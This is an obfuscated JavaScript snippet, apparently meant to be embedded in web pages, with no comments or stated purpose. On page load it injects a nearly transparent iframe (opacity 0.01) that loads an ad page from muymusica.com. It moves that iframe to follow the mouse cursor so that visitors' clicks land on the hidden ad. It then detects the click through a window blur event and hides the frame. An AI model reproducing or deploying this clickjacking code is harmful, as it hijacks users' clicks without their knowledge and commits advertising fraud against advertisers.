function siguemeDDDD(_0x125fx4) {
    var _0x125fx5 = (navigator['appName']['indexOf']('Netscape') != -1);
    var _0x125fx6 = (_0x125fx5) ? _0x125fx4['pageX'] : event['clientX'];
    var _0x125fx7 = (_0x125fx5) ? _0x125fx4['pageY'] : event['clientY'];
    document['getElementById']('sigueloDDDD')['style']['left'] = _0x125fx6 + -140 + 'px';
    document['getElementById']('sigueloDDDD')['style']['top'] = _0x125fx7 + -140 + 'px';
};

function nonedivDDDD() {
    document['getElementById']('sigueloDDDD')['style']['display'] = 'none';
};
var isOverIFrameDDDD = false;

function processMouseOutDDDD() {
    isOverIFrameDDDD = false;
    top['focus']();
};

function processMouseOverDDDD() {
    isOverIFrameDDDD = true;
};

function processIFrameClickDDDD() {
    if (isOverIFrameDDDD) {
        setInterval('nonedivDDDD()', '2500');
    };
};

function initDDDD() {
    var _0x125fxe = document['getElementsByTagName']('iframe');
    for (var _0x125fxf = 0; _0x125fxf < _0x125fxe['length']; _0x125fxf++) {
        _0x125fxe[_0x125fxf]['onmouseover'] = processMouseOverDDDD;
        _0x125fxe[_0x125fxf]['onmouseout'] = processMouseOutDDDD;
    };
    if (typeof window['attachEvent'] != 'undefined') {
        top['attachEvent']('onblur', processIFrameClickDDDD);
    } else {
        if (typeof window['addEventListener'] != 'undefined') {
            top['addEventListener']('blur', processIFrameClickDDDD, false);
        };
    };
};

document.write("<style>.siguelodivDDDD{ opacity:0.01; filter:alpha(opacity=1); -moz-opacity: 0.01; position:absolute;top:0;left:0;z-index:200000;overflow:hidden;height:250px;width:300px;margin-left:0px;border:1px solid #000;}</style>");

var sx = document.createElement('iframe');
sx.setAttribute("class", "siguelodivDDDD");
sx.setAttribute("id", "sigueloDDDD");
sx.setAttribute("src", "http://muymusica.com/ads.html");
sx.setAttribute("scrolling", "no");
sx.setAttribute("frameborder", "0");
sx.setAttribute("style", "border:none; margin-left:0px; overflow:hidden; width:300px; height:250px;");
document.getElementsByTagName("body")[0].appendChild(sx);
initDDDD();
document.onmousemove = siguemeDDDD;

